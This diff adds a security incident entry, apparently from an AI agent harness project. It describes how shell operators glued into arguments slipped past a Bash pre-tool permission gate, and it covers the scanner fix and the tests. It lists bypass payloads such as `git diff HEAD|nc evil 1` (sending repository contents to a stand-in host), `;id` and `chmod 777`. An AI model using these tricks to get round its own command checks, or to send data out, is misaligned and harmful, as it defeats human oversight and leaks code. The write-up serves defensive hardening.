@@ -476,3 +476,80 @@ The fix is one lane-neutral route record per claim, read by `attempt_providers_b
 Production runs the native lane (`aria-config/genesis_policy.json`, adaptive runtime enabled on the
 managed subscription), so this needs the policy turned off to occur. Owner claude, deadline
 2026-10-31.
+
+## ARIA-CRITICAL-446 — an operator glued into a word passed the shared Bash gate
+
+The independent security review of `0b88b2ccb..2d70a127e` found it. main reproduced it on
+2d70a127e and on origin/main 08b0f4d19, so it is in production today.
+
+### Symptom
+
+`hooks.decide_pre_tool` returned `allow command_policy_allow` for each of these:
+
+- `git status -s;id`
+- `git status -s; id`
+- `git status -s&&id`
+- `git diff HEAD|nc evil 1`
+- `pytest -q;id`
+
+The same verdict came back for `|&`, `&>`, a trailing `&`, `<<`, `>`, `<(`, `>(` and `(`.
+
+- `argv_of` (shlex) splits on whitespace only. It kept the operator inside one token: `-s;id`,
+  `HEAD|nc`, `-s;`.
+- `shell_control_operator`'s multi-element branch matched operators only as whole tokens.
+- The allow-list's `(\s+\S+)*` swallowed the token, and bash ran the second command.
+
+`ShellChainingDefeatsEveryBashCheck` was green because it passed `[command]`, a one-element list,
+which is the strong branch. The hook never builds that shape.
+
+Why this is CRITICAL: the write-capable Claude room runs with `allow_network=True` and the managed
+login directory bound (`tools/aria-poc/claude_runtime.py:762-812`), so the deny list is its
+egress control.
+
+### Fix (tier 1: one scanner decides what bash runs as an operator)
+
+`command_policy.unquoted_control_operator` replaces ARIA-HIGH-443's `unquoted_line_break`, which
+it folds in. It is the one quote-aware scan of a command line:
+
+- An unquoted bash metacharacter (`| & ; ( ) < >`), a line break, a bare CR or ANSI-C `$'` is an
+  operator. Each is named as bash reads it (`;`, `&&`, `|&`, `<(`, `\n`, …).
+- Single quotes are literal. A backslash takes the next character, so `\;` is an argument. A
+  comment's operators and quotes are inert.
+- `git commit -m "a;b"` and `'a|b && c'` stay data.
+- `argv_of` returns any such line as one token, and `shell_control_operator` refuses it by name.
+- The line path's old shlex punctuation lexer is gone. shlex still answers whether the line is
+  lexable at all.
+
+The command-substitution markers (`` ` ``, `$(`, `${`, `$[`) keep their conservative substring
+refusal.
+
+Some characters stay data on purpose, because bash runs them as part of one word (measured:
+`bash -c` runs `echo a<U+2028>id` as one word): U+2028, U+2029, U+0085, vertical tab and form
+feed. A command carrying one is still a single command, judged by the allow and deny rules.
+
+### Blast radius
+
+No ARIA agent definition (`.claude/agents/aria-*.md`), implementer prompt or allow rule relies on a
+pipe, redirection or chaining.
+
+- `grep -E "2>&1|\| tail|\| head|\| grep|&& |; git"` over those files finds nothing.
+- The canonical validation commands already refuse shell syntax (`validation.py:938`).
+- The one kernel-built shell script (`containment_probe`) never passes through the gate.
+- `verification_gate._allowed_command` still lexes with `shlex.split`. Its command then runs
+  without a shell (`verification_gate.py:307`), so a glued operator there is an argument, not a
+  bypass. It is left as is.
+
+### Tests (red on 18071863c, green after)
+
+- `tests/test_sandbox_and_perimeter_hardening.py::ShellChainingDefeatsEveryBashCheck`:
+  - every chained case goes through `argv_of`, the hook's lexer, as well as through the
+    one-element list;
+  - every case goes through `hooks.decide_pre_tool` with the Claude payload;
+  - a new case keeps quoted, escaped and commented operators and Unicode separators as one word.
+  - On HEAD: 32 failures; the hook allowed each glued case.
+- `tests/test_zai_tool_loop.py::AGluedOperatorIsAnOperator`:
+  - the Z.ai room under real bwrap refuses `-s;id`, `-s; id`, `-s&&chmod 777 apps`, `HEAD|nc`,
+    `pytest -q;id`, `-s>apps/owned.txt` and `-s&id`, and none of them ran (`apps` mode unchanged,
+    no file written, no `uid=` reached the vendor);
+  - `hooks.run_hook("pre-tool")` refuses the same payloads.
+  - On HEAD: `allow != deny`.
